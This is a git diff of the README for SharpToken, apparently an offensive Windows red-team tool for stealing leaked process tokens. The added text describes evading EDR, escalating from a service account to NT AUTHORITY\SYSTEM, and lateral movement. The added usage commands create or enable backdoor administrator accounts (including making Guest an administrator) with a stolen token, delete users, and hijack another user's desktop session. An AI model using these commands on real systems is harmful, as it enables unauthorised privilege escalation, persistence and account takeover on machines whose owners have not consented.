@@ -1,7 +1,10 @@
 # SharpToken
 
 
-NET version of incognito
+During red team lateral movement, we often need to steal the permissions of other users. Under the defense of modern EDR, it is difficult for us to use Mimikatz to obtain other user permissions, and if the target user has no process alive, we have no way to use "OpenProcessToken" to steal Token.
+
+
+SharpToken is a tool for exploiting Token leaks. It can find leaked Tokens from all processes in the system and use them. If you are a low-privileged service user, you can even use it to upgrade to "NT AUTHORITY\SYSTEM" privileges, and you can switch to the target user's desktop to do more without the target user's password. ..
 
 ![image](https://user-images.githubusercontent.com/43266206/188081018-8717b066-1143-48b8-b62b-31360316cce1.png)
 
@@ -106,6 +109,38 @@ SharpToken execute "NT AUTHORITY\SYSTEM" "cmd /c whoami"
 ```
 
 ![image](https://user-images.githubusercontent.com/43266206/176751980-dd9413f4-1a4d-4cb0-8ba2-5e0b9ccb2eed.png)
+
+
+## Create an admin user with the stolen token
+
+```
+
+SharpToken add_user admin Abcd1234! Administrators
+
+```
+
+## Enable an admin user with the stolen token
+
+
+```
+    SharpToken enableUser Guest Abcd1234! Administrators
+```
+
+## Delete a user with a stolen Token
+
+```
+    SharpToken delete_user admin
+```
+
+## Use the stolen Token to switch to the target's desktop
+
+
+Where 1 is the target user's desktop and 2 is the desktop we want to receive
+
+```
+    SharpToken tscon 1 2
+```
+
 
 ## Reference
 
